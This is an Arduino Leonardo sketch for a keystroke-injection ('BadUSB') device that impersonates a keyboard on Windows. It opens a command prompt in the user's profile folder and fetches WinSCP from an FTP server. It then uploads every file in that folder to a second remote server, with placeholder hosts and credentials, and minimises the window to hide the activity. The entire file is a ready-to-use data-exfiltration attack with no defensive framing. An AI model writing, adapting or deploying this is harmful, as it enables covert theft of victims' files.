#define kbd_es_es
#include <phukdlib_leonardo.h>

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("cmd");
  delay(3000);
  Keyboard.println("cd %USERPROFILE%");
  delay(2000);
  Keyboard.println("ftp -i SERVER");
  delay(2000);
  Keyboard.println("USERNAME");
  delay(2000);
  Keyboard.println("PASSWORD");
  delay(2000);
  Keyboard.println("GET WinSCP.com");
  delay(2000);
  Keyboard.println("GET WinSCP.exe");
  delay(2000);
  Keyboard.println("quit");
  delay(2000);
  Keyboard.println("WinSCP.com /command \"option batch abort\" \"option confirm off\" \"open ftp://USERNAME2:PASSWORD2@SERVER2\" \"put *.*\" \"close\" \"exit\"");
  delay(2000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.press('n');
  delay(100);
  Keyboard.releaseAll();
  while(1);
}
